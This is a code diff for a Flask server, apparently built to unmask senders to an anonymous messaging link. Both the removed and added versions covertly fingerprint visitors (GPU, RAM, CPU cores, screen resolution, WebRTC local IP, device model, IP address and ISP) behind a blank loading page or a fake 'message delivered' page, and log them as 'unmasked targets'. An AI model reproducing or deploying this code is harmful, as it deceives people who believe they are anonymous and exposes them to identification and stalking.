@@ -1,98 +1,83 @@
-from flask import Flask, redirect, request, render_template_string, make_response
+from flask import Flask, request, jsonify, render_template_string
+from flask_cors import CORS
 import datetime
 import requests
 
 app = Flask(__name__)
+# CORS allows your GitHub Pages site to send data to this Render server
+CORS(app)
 
-# REPLACE with your handle
-NGL_USER = "vaibhav_w16"
-
-def get_isp_info(ip):
-    try:
-        if ip in ['127.0.0.1', '::1']: return "Localhost", "Localhost"
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,org,city,mobile").json()
-        is_mobile = " [CELLULAR]" if r.get('mobile') else " [WIFI/BROADBAND]"
-        return r.get('isp', 'Unknown'), f"{r.get('org')} ({r.get('city')}){is_mobile}"
-    except:
-        return "Lookup Failed", "Lookup Failed"
+# The HTML shown after they hit 'Send'
+SUCCESS_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Message Sent</title>
+    <style>
+        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
+        h1 { color: #FE2F78; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1>✅ Sent!</h1>
+        <p>Your anonymous message was delivered.</p>
+    </div>
+</body>
+</html>
+"""
 
 @app.route('/')
-def fingerprint_jump():
-    html_payload = '''
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Loading...</title>
-        <script>
-            async function collectAll() {
-                // 1. GPU & Hardware
-                const gl = document.createElement('canvas').getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
-                const ram = navigator.deviceMemory || "Unknown";
-                const cores = navigator.hardwareConcurrency || "Unknown";
+def home():
+    return "Backend is Running. Waiting for POST requests at /submit", 200
 
-                // 2. Physical Resolution Math (Your Update)
-                const ratio = window.devicePixelRatio || 1;
-                const res = `${window.screen.width * ratio}x${window.screen.height * ratio} (@${ratio}x)`;
+@app.route('/submit', methods=['POST'])
+def submit():
+    try:
+        # 1. Get the message text
+        msg = request.form.get('message', 'No Message')
 
-                // 3. Network & WebRTC
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const netType = conn ? conn.effectiveType : "unknown";
-                let localIP = "N/A";
-                const pc = new RTCPeerConnection({iceServers:[]});
-                pc.createDataChannel("");
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                pc.onicecandidate = (i) => {
-                    if (i && i.candidate) {
-                        const m = i.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                        if (m) localIP = m[1];
-                    }
-                };
+        # 2. Get IP and ISP (Server-Side)
+        # Render uses a proxy, so we check 'X-Forwarded-For' for the real IP
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+        
+        isp_info = "Unknown ISP"
+        try:
+            # Quick lookup of the provider (Jio, Airtel, etc.)
+            response = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,org,mobile", timeout=5)
+            data = response.json()
+            isp_info = f"{data.get('isp')} | Mobile: {data.get('mobile')}"
+        except:
+            pass
 
-                setTimeout(() => {
-                    const params = new URLSearchParams({
-                        gpu: gpu, net: netType, local: localIP, 
-                        ram: ram, cores: cores, res: res
-                    });
-                    window.location.href = "/final?" + params.toString();
-                }, 700); // Slightly longer for WebRTC stability
-            }
-            window.onload = collectAll;
-        </script>
-    </head>
-    <body style="background:#000;"></body>
-    </html>
-    '''
-    response = make_response(render_template_string(html_payload))
-    response.headers["Accept-CH"] = "Sec-CH-UA-Model, Sec-CH-UA-Platform-Version"
-    response.headers["Critical-CH"] = "Sec-CH-UA-Model"
-    response.headers["Permissions-Policy"] = 'ch-ua-model=("*")'
-    return response
+        # 3. Get Hardware Specs (Client-Side from hidden inputs)
+        gpu = request.form.get('gpu', 'Unknown GPU')
+        res = request.form.get('res', 'Unknown Res')
+        ram = request.form.get('ram', 'Unknown RAM')
+        cores = request.form.get('cores', 'Unknown Cores')
 
-@app.route('/final')
-def final_report():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    isp, location = get_isp_info(ip)
-    
-    # Headers
-    model = request.headers.get('Sec-CH-UA-Model', 'Frozen').strip('"')
-    os_ver = request.headers.get('Sec-CH-UA-Platform-Version', 'Unknown').strip('"')
+        # 4. Format the "Unmasking" Log
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        log_entry = (
+            f"\n{'='*40}\n"
+            f"🕒 TIME:    {timestamp}\n"
+            f"💬 MESSAGE: {msg}\n"
+            f"🌐 NETWORK: IP: {ip} | ISP: {isp_info}\n"
+            f"💻 HARDWARE: GPU: {gpu} | RAM: {ram}GB | CPU: {cores} cores | RES: {res}\n"
+            f"{'='*40}\n"
+        )
 
-    # URL Params
-    log_entry = (
-        f"--- FINAL UNMASK: {datetime.datetime.now().strftime('%H:%M:%S')} ---\n"
-        f"DEVICE: {model} | OS: Android {os_ver}\n"
-        f"ISP: {isp} | LOC: {location}\n"
-        f"NET: {request.args.get('net').upper()} | LOCAL IP: {request.args.get('local')}\n"
-        f"GPU: {request.args.get('gpu')}\n"
-        f"SPECS: RAM({request.args.get('ram')}GB) | CPU({request.args.get('cores')}) | RES({request.args.get('res')})\n"
-        f"{'='*60}\n"
-    )
-    
-    with open("unmasked_targets.log", "a") as f: f.write(log_entry)
-    print(log_entry)
-    return redirect(f"https://ngl.link/{NGL_USER}")
+        # 5. Print to Render Logs (This is where you see the data)
+        print(log_entry)
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+        # 6. Return a nice success page to the user
+        return render_template_string(SUCCESS_PAGE)
+
+    except Exception as e:
+        print(f"Error: {e}")
+        return "Internal Server Error", 500
+
+if __name__ == "__main__":
+    app.run()
